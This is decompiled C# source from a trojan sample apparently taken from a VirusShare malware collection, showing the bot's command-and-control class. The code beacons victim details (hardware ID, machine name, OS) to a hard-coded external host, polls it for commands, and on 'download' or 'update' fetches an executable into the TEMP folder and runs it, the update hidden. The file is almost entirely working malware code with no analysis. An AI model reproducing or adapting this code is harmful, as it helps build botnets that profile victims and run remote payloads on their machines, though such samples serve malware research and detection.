// Decompiled with JetBrains decompiler
// Type: _2012.x0_con
// Assembly: 2012, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: F5694FB0-D176-4C80-83D0-71B8F6A2BF06
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00050-msil\Trojan-Ransom.Win32.Blocker.cmxi-ac38440cdaaa0a8f08255d957aa7b8a4bfc2438b.exe

using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Threading;

namespace _2012
{
  internal class x0_con
  {
    private static HttpWebRequest wReq;
    private static WebResponse wRes;
    private static string coldcmd = string.Empty;
    private static bool start = false;

    public static void conectar()
    {
      try
      {
        if (!x0_con.start)
        {
          x0_con.m0();
          x0_con.m1();
        }
        else
        {
          x0_con.start = false;
          x0_con.m0();
          x0_con.m1();
        }
      }
      catch (Exception ex)
      {
        Thread.Sleep(60000);
        x0_con.conectar();
      }
    }

    private static void m0()
    {
      string datos = "mode=0&hwid=" + x0_inf.inf_uid() + "&pcname=" + Environment.MachineName + "&version=3&system=" + x0_inf.inf_SO() + "&flags=" + x0_inf.inf_flags();
      while (true)
      {
        try
        {
          string str = x0_con.hr(datos);
          if (str.Length > 0)
          {
            if (str == "pexp3xp0xpox")
              break;
          }
          else
          {
            Thread.Sleep(60000);
            x0_con.conectar();
          }
        }
        catch (Exception ex)
        {
          Thread.Sleep(60000);
          x0_con.conectar();
        }
        x0_fnc.Flush();
        Thread.Sleep(60000);
      }
    }

    private static void m1()
    {
      string datos = "mode=1&hwid=" + x0_inf.inf_uid();
      x0_con.start = true;
      while (x0_con.start)
      {
        try
        {
          string xcmd = x0_con.hr(datos);
          if (xcmd.Length > 0)
          {
            if (xcmd != string.Empty)
            {
              x0_con.execmd(xcmd);
              x0_con.coldcmd = xcmd;
            }
          }
          else
            x0_con.coldcmd = string.Empty;
        }
        catch (Exception ex)
        {
          Thread.Sleep(60000);
          x0_con.conectar();
        }
        x0_fnc.Flush();
        Thread.Sleep(300000);
      }
    }

    private static string hr(string datos)
    {
      ServicePointManager.Expect100Continue = false;
      x0_con.wReq = (HttpWebRequest) WebRequest.Create("http://www3.j03h.com?" + datos);
      x0_con.wReq.ContentType = "application/x-www-form-urlencoded";
      x0_con.wReq.UserAgent = "pexp3xp0xpox";
      x0_con.wRes = x0_con.wReq.GetResponse();
      if (x0_con.wRes != null)
        return new StreamReader(x0_con.wRes.GetResponseStream()).ReadToEnd().Trim();
      x0_con.wRes.Close();
      return string.Empty;
    }

    private static void execmd(string xcmd)
    {
      string[] strArray = new string[0];
      try
      {
        strArray = xcmd.Split('*');
      }
      catch
      {
      }
      switch (strArray[0])
      {
        case "download":
          try
          {
            string str = x0_fnc.gstring(new Random().Next(5, 12)) + ".exe";
            new WebClient().DownloadFile(Convert.ToString(strArray[1]), Environment.GetEnvironmentVariable("TEMP") + "\\" + str);
            new Process()
            {
              StartInfo = {
                FileName = (Environment.GetEnvironmentVariable("TEMP") + "\\" + str)
              }
            }.Start();
            break;
          }
          catch
          {
            break;
          }
        case "update":
          string xfilea = Convert.ToString(strArray[1]);
          string sVER = Convert.ToString(strArray[2]);
          if (!xfilea.StartsWith("http://"))
            xfilea = "http://" + xfilea;
          x0_con.xubot(xfilea, sVER);
          break;
      }
    }

    private static void xubot(string xfilea, string sVER)
    {
      if (!(sVER != "3"))
        return;
      try
      {
        x0_str.xmux.Close();
      }
      catch (Exception ex)
      {
        Console.WriteLine((object) ex);
      }
      try
      {
        string str = x0_fnc.gstring(new Random().Next(5, 12)) + ".exe";
        new WebClient().DownloadFile(xfilea, Environment.GetEnvironmentVariable("TEMP") + "\\" + str);
        new Process()
        {
          StartInfo = {
            FileName = (Environment.GetEnvironmentVariable("TEMP") + "\\" + str),
            WindowStyle = ProcessWindowStyle.Hidden
          }
        }.Start();
      }
      catch (Exception ex)
      {
      }
      Environment.Exit(0);
    }
  }
}
